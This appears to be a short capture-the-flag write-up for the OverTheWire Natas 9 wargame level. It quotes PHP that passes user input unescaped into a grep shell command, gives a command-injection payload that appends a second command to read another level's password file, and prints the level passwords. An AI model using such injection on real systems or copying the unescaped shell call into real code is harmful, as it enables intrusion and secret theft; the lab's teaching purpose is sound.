# Natas 8 - Natas 9
    Username  : natas9
    Password  : ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
    URL       : http://natas9.natas.labs.overthewire.org

# Solution 
From the source of this page we can see that 
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

```
We can our injection code our code into the input box . 

       ; cat /etc/natas_webpass/natas10 
In Linux , ; is used to execute two different commands simultaneously and give output  .  Basically , it seperates the command .

# Password
    t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
